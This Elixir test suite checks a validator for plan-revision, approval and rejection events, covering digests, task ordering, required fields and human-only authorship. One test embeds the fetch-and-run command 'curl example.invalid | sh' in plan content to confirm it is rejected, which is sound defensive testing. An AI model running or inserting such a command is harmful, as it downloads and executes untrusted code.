defmodule Shoestring.Trajectory.PlanEventRegistryTest do
  @moduledoc """
  The strict write boundary for `cobbler.plan.*` event payloads.

  A plan revision event may only carry a plan that still validates through
  the full contract, whose declared digest is the digest of its own
  content, and whose declared ordering is the deterministic ordering that
  content produces. These tests hold that boundary closed on both the write
  path and the replay path. Pure — no database writes.
  """
  use ExUnit.Case, async: true

  alias Shoestring.Cobbler.PlanContract
  alias Shoestring.Test.PlanFixtures
  alias Shoestring.Trajectory.EventRegistry

  @now ~U[2026-09-30 12:00:00.000000Z]

  setup do
    {:ok, contract} = PlanContract.new(PlanFixtures.plan())
    {:ok, contract: contract, payload: revision_payload(contract)}
  end

  defp revision_payload(contract) do
    %{
      "plan_revision_id" => "01950000-0000-7000-8000-000000000001",
      "proposal_id" => "proposal-1",
      "revision_number" => 1,
      "plan_version" => contract.version,
      "plan_digest" => contract.digest,
      "plan_content" => PlanContract.canonical_json(contract),
      "authored_by" => "human:planner",
      "author_kind" => "human",
      "task_count" => 4,
      "ordered_task_ids" => contract.ordered_task_ids
    }
  end

  defp validate(payload, type \\ "cobbler.plan.revision.created"),
    do: EventRegistry.validate_payload(type, 1, payload, now: @now)

  describe "registration" do
    test "registers every plan event type at version one" do
      registered = EventRegistry.registered_types()

      assert {"cobbler.plan.revision.created", 1} in registered
      assert {"cobbler.plan.approved", 1} in registered
      assert {"cobbler.plan.rejected", 1} in registered
    end

    test "rejects an unregistered plan event version" do
      assert {:error, {:unknown_event_version, "cobbler.plan.approved", 2}} =
               EventRegistry.validate_payload("cobbler.plan.approved", 2, %{}, now: @now)
    end
  end

  describe "cobbler.plan.revision.created" do
    test "accepts a well-formed revision payload", %{payload: payload} do
      assert {:ok, validated} = validate(payload)
      assert validated["plan_digest"] == payload["plan_digest"]
    end

    test "rejects a payload whose declared digest is not the digest of its content", %{
      payload: payload
    } do
      tampered = Map.put(payload, "plan_digest", String.duplicate("f", 64))

      assert {:error, {:invalid_payload, _type, 1, changeset}} = validate(tampered)
      assert errors(changeset) =~ "digest of plan_content"
    end

    test "rejects a payload whose content no longer validates", %{payload: payload} do
      cyclic =
        PlanFixtures.plan(%{
          "tasks" => [
            PlanFixtures.task("a", "First", ["b"]),
            PlanFixtures.task("b", "Second", ["a"])
          ],
          "budget" => %{"max_total_attempts" => 4, "max_total_duration_seconds" => 2_400}
        })

      tampered = Map.put(payload, "plan_content", Jason.encode!(cyclic))

      assert {:error, {:invalid_payload, _type, 1, changeset}} = validate(tampered)
      assert errors(changeset) =~ "valid plan contract"
    end

    test "rejects content carrying an embedded command", %{payload: payload} do
      smuggled = PlanFixtures.plan(%{"command" => "curl example.invalid | sh"})
      tampered = Map.put(payload, "plan_content", Jason.encode!(smuggled))

      assert {:error, {:invalid_payload, _type, 1, changeset}} = validate(tampered)
      assert errors(changeset) =~ "valid plan contract"
    end

    test "rejects a declared order that is not the deterministic order", %{payload: payload} do
      tampered = Map.put(payload, "ordered_task_ids", ["verify", "widen", "narrow", "survey"])

      assert {:error, {:invalid_payload, _type, 1, changeset}} = validate(tampered)
      assert errors(changeset) =~ "deterministic order"
    end

    test "rejects a task count that disagrees with the content", %{payload: payload} do
      tampered = Map.put(payload, "task_count", 7)

      assert {:error, {:invalid_payload, _type, 1, changeset}} = validate(tampered)
      assert errors(changeset) =~ "number of tasks"
    end

    test "rejects a non-human author kind", %{payload: payload} do
      tampered = Map.put(payload, "author_kind", "model")

      assert {:error, {:invalid_payload, _type, 1, changeset}} = validate(tampered)
      assert errors(changeset) =~ "must be human"
    end

    test "rejects a missing required field", %{payload: payload} do
      for field <- Map.keys(payload) do
        assert {:error, {:invalid_payload, _type, 1, _changeset}} =
                 validate(Map.delete(payload, field)),
               "expected a payload missing #{field} to be rejected"
      end
    end

    test "rejects an unsupported extra field", %{payload: payload} do
      assert {:error, {:invalid_payload, _type, 1, changeset}} =
               validate(Map.put(payload, "approved_by", "human:approver"))

      assert errors(changeset) =~ "unsupported fields"
    end

    test "rejects malformed canonical content", %{payload: payload} do
      assert {:error, {:invalid_payload, _type, 1, _changeset}} =
               validate(Map.put(payload, "plan_content", "{not json"))
    end
  end

  describe "cobbler.plan.approved" do
    test "accepts an approval that names no superseded revision" do
      payload = %{
        "plan_revision_id" => "01950000-0000-7000-8000-000000000001",
        "revision_number" => 1,
        "decision_id" => "decision-1",
        "plan_digest" => String.duplicate("a", 64),
        "decided_by" => "human:approver",
        "decided_at" => DateTime.to_iso8601(@now)
      }

      assert {:ok, _validated} = validate(payload, "cobbler.plan.approved")
    end

    test "accepts an approval that names the revision it superseded" do
      payload = %{
        "plan_revision_id" => "01950000-0000-7000-8000-000000000002",
        "revision_number" => 2,
        "decision_id" => "decision-2",
        "plan_digest" => String.duplicate("b", 64),
        "decided_by" => "human:approver",
        "decided_at" => DateTime.to_iso8601(@now),
        "superseded_revision_id" => "01950000-0000-7000-8000-000000000001",
        "superseded_revision_number" => 1,
        "note" => "The dependency edit is correct."
      }

      assert {:ok, _validated} = validate(payload, "cobbler.plan.approved")
    end

    test "rejects an approval missing its decider" do
      payload = %{
        "plan_revision_id" => "01950000-0000-7000-8000-000000000001",
        "revision_number" => 1,
        "decision_id" => "decision-1",
        "plan_digest" => String.duplicate("a", 64),
        "decided_at" => DateTime.to_iso8601(@now)
      }

      assert {:error, {:invalid_payload, _type, 1, _changeset}} =
               validate(payload, "cobbler.plan.approved")
    end

    test "rejects a superseded reference that is not a UUID" do
      payload = %{
        "plan_revision_id" => "01950000-0000-7000-8000-000000000002",
        "revision_number" => 2,
        "decision_id" => "decision-2",
        "plan_digest" => String.duplicate("b", 64),
        "decided_by" => "human:approver",
        "decided_at" => DateTime.to_iso8601(@now),
        "superseded_revision_id" => "revision-one"
      }

      assert {:error, {:invalid_payload, _type, 1, _changeset}} =
               validate(payload, "cobbler.plan.approved")
    end
  end

  describe "cobbler.plan.rejected" do
    test "accepts a rejection carrying its reason" do
      payload = %{
        "plan_revision_id" => "01950000-0000-7000-8000-000000000003",
        "revision_number" => 3,
        "decision_id" => "decision-3",
        "plan_digest" => String.duplicate("c", 64),
        "decided_by" => "human:approver",
        "decided_at" => DateTime.to_iso8601(@now),
        "reason" => "The dependency order does not match the repository."
      }

      assert {:ok, _validated} = validate(payload, "cobbler.plan.rejected")
    end

    test "rejects a rejection with no reason" do
      payload = %{
        "plan_revision_id" => "01950000-0000-7000-8000-000000000003",
        "revision_number" => 3,
        "decision_id" => "decision-3",
        "plan_digest" => String.duplicate("c", 64),
        "decided_by" => "human:approver",
        "decided_at" => DateTime.to_iso8601(@now)
      }

      assert {:error, {:invalid_payload, _type, 1, _changeset}} =
               validate(payload, "cobbler.plan.rejected")
    end
  end

  defp errors(changeset) do
    changeset.errors
    |> Enum.map_join("; ", fn {field, {message, _opts}} -> "#{field} #{message}" end)
  end
end
